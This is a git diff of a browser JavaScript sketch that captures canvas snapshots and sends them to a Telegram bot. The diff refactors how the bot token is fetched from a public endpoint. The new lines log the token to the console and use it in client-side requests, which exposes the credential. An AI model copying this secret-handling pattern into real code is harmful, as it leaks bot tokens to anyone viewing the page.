@@ -9,9 +9,6 @@ let env = undefined;
 const imgSize = [480,640];
 const screenScale = 0.75;
 
-async function fetchEnvVariables() {  
-}
-
 function setup() {
 
 	pixelDensity(1); 
@@ -51,20 +48,23 @@ function takeSnapshot() {
   sendToTelegram(img.canvas.toDataURL());
 }
 
-async function sendToTelegram(imageDataUrl) {
-
+async function fetchEnvVariables() {
   fetch('https://upload-jpg.vercel.app/api/secrets')
   .then(response => response.json())
   .then(data => {
     if (data.error) {
       console.error('Error:', data.error);
     } else {
-      return(data.secret);
+      env = data.secret;
+      console.log('env set', env);
     }
   })
   .catch(error => {
     console.error('Error fetching secret:', error);
   });
+}
+
+async function sendToTelegram(imageDataUrl) {
 
   // Преобразование DataURL в Blob
   fetch(imageDataUrl)
@@ -73,7 +73,7 @@ async function sendToTelegram(imageDataUrl) {
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', blob, 'snapshot.png');
-
+      console.log('env get',env);
       fetch(`https://api.telegram.org/bot${env}/sendPhoto`, {
         method: 'POST',
         body: formData
